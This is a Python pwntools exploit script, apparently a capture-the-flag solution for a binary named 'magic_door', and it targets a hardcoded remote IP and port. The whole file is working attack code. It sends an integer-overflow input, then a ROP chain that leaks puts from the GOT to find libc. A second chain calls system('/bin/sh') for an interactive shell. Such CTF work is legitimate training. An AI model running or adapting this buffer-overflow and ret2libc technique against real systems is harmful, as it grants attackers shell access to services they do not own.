#!/usr/bin/env python3

from pwn import *

exe = ELF("./magic_door_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("13.229.150.169", 34056)

    return r


def main():
    r = conn()

    # good luck pwning :)
    a = 50015 + 2**32
    r.sendlineafter(b"open?", str(a).encode())
    # 0x0000000000401434 : pop rdi ; ret
    payload = b'a'*72
    payload += p64(0x0000000000401434)
    payload += p64(exe.got.puts)
    payload += p64(exe.sym.puts)
    payload += p64(exe.sym.magic_door)

    r.sendlineafter(b"go?", payload)
    r.recvline()
    leak = u64(r.recvn(6) + b"\x00"*2)
    print(hex(leak))
    base = leak - 0x80e50
    system = base + 0x50d70
    binsh = base + 0x1d8698

    payload = b'a'*72
    payload += p64(0x0000000000401434)
    payload += p64(binsh)
    payload += p64(0x0000000000401434+1)
    payload += p64(system)

    r.sendlineafter(b"go?", payload)

    r.interactive()


if __name__ == "__main__":
    main()
